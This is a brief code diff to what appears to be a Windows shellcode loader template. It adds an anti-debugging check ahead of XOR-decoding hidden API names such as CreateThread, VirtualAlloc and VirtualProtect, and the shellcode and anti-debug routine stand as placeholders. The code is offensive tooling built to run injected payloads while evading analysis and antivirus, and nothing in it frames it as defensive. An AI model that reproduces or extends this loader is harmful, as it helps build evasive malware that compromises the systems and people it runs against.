@@ -4,6 +4,7 @@
 #include <string.h>
 #include <conio.h> 
 #include <iostream>
+#include <winternl.h>
 
 <SHELLCODE>
 
@@ -44,6 +45,9 @@ void xor_data(unsigned char data[], int dataLen, char key[], int keyLen)
 }
 
 
+<ANTI_DEBUG>
+
+
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     _In_opt_ HINSTANCE hPrevInstance,
     _In_ LPWSTR    lpCmdLine,
@@ -61,6 +65,9 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     unsigned char crea[] = <CREATE_THREAD>
     unsigned char virProtect[] = <VIRTUAL_PROTECT>
     unsigned char virAlloc[] = <VIRTUAL_ALLOC>
+
+    // Anti debug check
+    antiDebug();
 
     // More dynamic invoke shit
     xor_data(kern, sizeof(kern), key, key_len);
